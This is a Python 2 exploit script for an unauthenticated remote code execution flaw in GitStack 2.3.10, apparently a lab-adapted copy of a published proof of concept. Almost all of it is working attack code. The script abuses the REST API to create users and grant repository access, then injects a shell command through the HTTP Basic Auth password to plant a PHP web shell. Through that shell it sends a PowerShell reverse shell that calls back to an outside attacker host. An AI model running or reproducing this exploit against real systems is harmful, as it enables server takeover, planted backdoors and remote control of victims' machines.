#!/usr/bin/python2
# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#
#1. Description
#
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = '10.200.100.150'

# What command you want to execute
command = 'powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.200.100.200\',16000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print "[+] Get user list"
try:
	r = requests.get("http://{}/rest/user/".format(ip))
	user_list = r.json()
	user_list.remove('everyone')
except:
	pass

if len(user_list) > 0:
	username = user_list[0]
	print "[+] Found user {}".format(username)
else:
	r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
	print "[+] Create user"

	if not "User created" in r.text and not "User already exist" in r.text:
		print "[-] Cannot create user"
		os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
	print "[+] Web repository already enabled"
else:
	print "[+] Enable web repository"
	r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
	if not "Web interface successfully enabled" in r.text:
		print "[-] Cannot enable web interface"
		os._exit(0)

print "[+] Get repositories list"
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
	repository = repository_list[0]['name']
	print "[+] Found repository {}".format(repository)
else:
	print "[+] Create repository"

	r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
	if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
		print "[-] Cannot create repository"
		os._exit(0)

print "[+] Add user to repository"
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
	print "[-] Cannot add user to repository"
	os._exit(0)

print "[+] Disable access for anyone"
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
	print "[-] Cannot remove access for anyone"
	os._exit(0)

print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit-AppleGamer22.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit-AppleGamer22.php".format(ip), data={'a' : command}, cookies={'csrftoken': 'oUqvTTfn4xurfQ1gilfCg4iP3HGLUVRi; sessionid=97ebdea98d73160c71872972106387a3'}, headers={'Content-Type': 'application/x-www-form-urlencoded'})
print r.text.encode(sys.stdout.encoding, errors='replace')